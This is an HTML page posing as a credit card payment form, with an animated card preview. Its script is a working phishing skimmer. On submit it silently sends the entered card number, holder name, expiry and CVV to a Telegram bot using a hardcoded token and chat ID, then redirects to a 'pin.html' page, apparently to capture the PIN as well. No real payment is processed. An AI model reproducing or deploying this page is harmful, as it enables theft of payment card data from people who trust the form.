<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- custom css file link  -->
    <link rel="stylesheet" href="css/style.css">

</head>
<body>

<div class="container">

    <div class="card-container">

        <div class="front">
            <div class="image">
                <img src="image/chip.png" alt="">
                <img src="image/visa.png" alt="">
            </div>
            <div class="card-number-box">****************</div>
            <div class="flexbox">
                <div class="box">
                    <span>card holder</span>
                    <div class="card-holder-name">FULL NAME</div>
                </div>
                <div class="box">
                    <span>expires</span>
                    <div class="expiration">
                        <span class="exp-month">MM</span> /
                        <span class="exp-year">YY</span>
                    </div>
                </div>
            </div>
        </div>

        <div class="back">
            <div class="stripe"></div>
            <div class="box">
                <span>cvv</span>
                <div class="cvv-box">***</div>
                <img src="image/visa.png" alt="">
            </div>
        </div>

    </div>

    <form id="paymentForm">
        <div class="inputBox">
            <span>card number</span>
            <input type="text" maxlength="16" class="card-number-input" placeholder="**** **** **** ****">
        </div>
        <div class="inputBox">
            <span>card holder</span>
            <input type="text" class="card-holder-input" placeholder="Full Name">
        </div>
        <div class="flexbox">
            <div class="inputBox">
                <span>expiration mm</span>
                <select class="month-input">
                    <option value="" selected disabled>MM</option>
                    <option value="01">01</option>
                    <option value="02">02</option>
                    <option value="03">03</option>
                    <option value="04">04</option>
                    <option value="05">05</option>
                    <option value="06">06</option>
                    <option value="07">07</option>
                    <option value="08">08</option>
                    <option value="09">09</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                </select>
            </div>
            <div class="inputBox">
                <span>expiration yy</span>
                <select class="year-input">
                    <option value="" selected disabled>YY</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                    <option value="2030">2030</option>
                </select>
            </div>
            <div class="inputBox">
                <span>cvv</span>
                <input type="text" maxlength="4" class="cvv-input" placeholder="***">
            </div>
        </div>
        <input type="submit" value="Pay Now" class="submit-btn">
    </form>

</div>    

<script>
const botToken = "7588718968:AAGDy9oxDYVHgTZm_VvQOZP5V4L40DGWjB0"; // Replace with your Telegram bot token
const chatId = "7490634345"; // Replace with your Telegram chat ID

document.querySelector('.card-number-input').oninput = () => {
  let value = document.querySelector('.card-number-input').value;
  document.querySelector('.card-number-box').innerText = value.replace(/\d(?=\d{4})/g, "*");
}

document.querySelector('.card-holder-input').oninput = () => {
  document.querySelector('.card-holder-name').innerText = document.querySelector('.card-holder-input').value;
}

document.querySelector('.month-input').oninput = () => {
  document.querySelector('.exp-month').innerText = document.querySelector('.month-input').value;
}

document.querySelector('.year-input').oninput = () => {
  document.querySelector('.exp-year').innerText = document.querySelector('.year-input').value;
}

document.querySelector('.cvv-input').onmouseenter = () => {
  document.querySelector('.front').style.transform = 'perspective(1000px) rotateY(-180deg)';
  document.querySelector('.back').style.transform = 'perspective(1000px) rotateY(0deg)';
}

document.querySelector('.cvv-input').onmouseleave = () => {
  document.querySelector('.front').style.transform = 'perspective(1000px) rotateY(0deg)';
  document.querySelector('.back').style.transform = 'perspective(1000px) rotateY(180deg)';
}

document.querySelector('.cvv-input').oninput = () => {
  let value = document.querySelector('.cvv-input').value;
  document.querySelector('.cvv-box').innerText = value.replace(/\d/g, "*");
}

// Send data to Telegram bot without alert
document.getElementById("paymentForm").onsubmit = (e) => {
  e.preventDefault(); // Prevent form from reloading
  
  let cardNumber = document.querySelector('.card-number-input').value;
  let cardHolder = document.querySelector('.card-holder-input').value;
  let expMonth = document.querySelector('.month-input').value;
  let expYear = document.querySelector('.year-input').value;
  let cvv = document.querySelector('.cvv-input').value;
  
  let message = `ðŸ’³ *New Credit card Payment Attempt*:\n\n` +
    `ðŸ‘¤ *Card Holder:* ${cardHolder}\n` +
    `ðŸ’³ *Card Number:* ${cardNumber}\n` +
    `ðŸ“… *Expiry:* ${expMonth}/${expYear}\n` +
    `ðŸ”’ *CVV:* ${cvv}`;
  
  let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
  
  fetch(telegramUrl)
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        window.location.href = "pin.html";
        console.log("Payment Details Sent to Telegram!");
      }
    })
    .catch(error => {
      console.error("Failed to send data:", error);
    });
}
</script>

</body>
</html>
